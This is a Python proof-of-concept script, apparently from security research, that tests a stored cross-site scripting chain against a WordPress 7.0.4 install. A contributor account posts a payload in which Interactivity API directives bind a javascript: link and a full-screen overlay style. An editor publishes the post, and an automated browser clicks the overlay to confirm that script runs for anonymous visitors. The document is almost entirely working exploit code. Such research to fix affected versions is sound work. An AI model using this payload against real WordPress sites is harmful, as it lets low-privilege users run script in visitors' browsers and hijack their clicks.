#!/usr/bin/env python3
"""Same chain against the 7.0.4 control install, to fix the affected range."""
import json
import re
import requests
from playwright.sync_api import sync_playwright
from wplab704 import sess, BASE

CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome"

contrib = sess("contributor")
editor = sess("editor")
anon = requests.Session()

JS = "window.__PWNED__=document.domain;void 0"
CSS = "position:fixed;top:0px;left:0px;right:0px;bottom:0px;z-index:2147483647;display:block"
CONTEXT = json.dumps({"u": "javascript:" + JS, "s": CSS})
PAYLOAD = (
    "<div data-wp-interactive='{\"namespace\":\"pwn\"}' "
    "data-wp-context='" + CONTEXT.replace("'", "&#039;") + "'>"
    "<a id=\"pwnlink\" data-wp-bind--href=\"context.u\" data-wp-bind--style=\"context.s\">"
    "&nbsp;</a></div>"
)

j = contrib.rest("POST", "/wp/v2/posts", json={
    "title": "704 chain", "content": PAYLOAD, "status": "pending"}).json()
pid = j["id"]
print("stored directives:",
      [d for d in ("data-wp-interactive", "data-wp-context",
                   "data-wp-bind--href", "data-wp-bind--style")
       if d in j["content"]["raw"]])
editor.rest("POST", f"/wp/v2/posts/{pid}", json={"status": "publish"})
url = BASE + f"/?p={pid}"
html = anon.get(url).text
m = re.search(r'<a id="pwnlink"[^>]*>', html)
anchor = m.group(0) if m else ""
print("server anchor      :", anchor)
print("server wrote href= :", bool(re.search(r"\shref=", anchor)))
print("runtime on page    :", "script-modules/interactivity/index.min.js" in html)

with sync_playwright() as p:
    b = p.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
    page = b.new_page()
    page.goto(url, wait_until="networkidle")
    page.wait_for_timeout(1500)
    print("DOM href           :", json.dumps(
        page.eval_on_selector("#pwnlink", "el => el.getAttribute('href')")))
    print("DOM style          :", json.dumps(
        page.eval_on_selector("#pwnlink", "el => el.getAttribute('style')")))
    vp = page.evaluate("() => ({w: innerWidth, h: innerHeight})")
    page.mouse.click(vp["w"] // 2, vp["h"] // 2)
    page.wait_for_timeout(1200)
    print("executed           :", json.dumps(page.evaluate("() => window.__PWNED__ || null")))
    b.close()
